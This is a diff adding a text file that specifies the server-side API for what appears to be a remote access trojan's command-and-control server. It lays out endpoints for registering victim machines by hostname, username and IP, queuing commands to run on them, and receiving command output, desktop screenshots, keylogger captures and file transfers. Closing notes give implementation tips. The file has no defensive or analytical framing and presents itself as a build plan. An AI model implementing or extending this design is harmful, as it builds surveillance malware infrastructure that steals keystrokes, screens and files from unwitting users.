@@ -1,0 +1,60 @@
+
+API ENDPOINTS TO IMPLEMENT ON THE SERVER SIDE:
+
+The following endpoints need to be implemented on your server to handle the client connections:
+
+1. POST /api/clients/register
+   - Registers a new client
+   - Body: { id, hostname, username, os, ip, status }
+   - Response: 200 OK
+
+2. GET /api/clients/{id}/commands
+   - Gets pending commands for a client
+   - Response: Array of command objects
+
+3. POST /api/clients/{id}/command-results
+   - Receives the results of a command execution
+   - Body: { command, output, error }
+   - Response: 200 OK
+
+4. PUT /api/clients/{id}/status
+   - Updates client online status
+   - Body: { status, lastSeen }
+   - Response: 200 OK
+
+5. POST /api/clients/{id}/desktop-stream
+   - Receives desktop screenshots
+   - Body: Binary image data
+   - Response: 200 OK
+
+6. POST /api/clients/{id}/keylog
+   - Receives keylog data
+   - Body: { data }
+   - Response: 200 OK
+
+7. POST /api/clients/{id}/commands/{commandId}/ack
+   - Acknowledges command execution
+   - Response: 200 OK
+
+8. POST /api/clients/{id}/file-transfers
+   - Reports file transfer status
+   - Body: { path, status }
+   - Response: 200 OK
+
+9. GET /api/files
+   - Downloads a file from the server
+   - Query: ?path=<file_path>
+   - Response: Binary file data
+
+10. POST /api/files
+    - Uploads a file to the server
+    - Query: ?path=<file_path>
+    - Body: Binary file data
+    - Response: 200 OK
+
+Implementation Notes:
+- These endpoints should be secured with proper authentication
+- Consider using WebSockets for real-time communication
+- For desktop streaming, consider optimizing the image transfer (compression, delta updates)
+- Store commands in a queue for each client
+- Implement proper error handling and logging
